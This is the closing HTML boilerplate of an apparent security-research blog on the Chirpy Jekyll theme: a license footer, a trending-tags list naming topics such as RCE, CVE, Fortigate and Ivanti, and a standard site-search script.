        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98/">空间测绘</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fortigate/">Fortigate</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ivanti/">IVanti</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mcp/">MCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/palo-alto-networks-pan-os/">Palo-Alto-Networks-PAN-OS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/showdoc/">ShowDoc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/simplehelp/">SimpleHelp</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

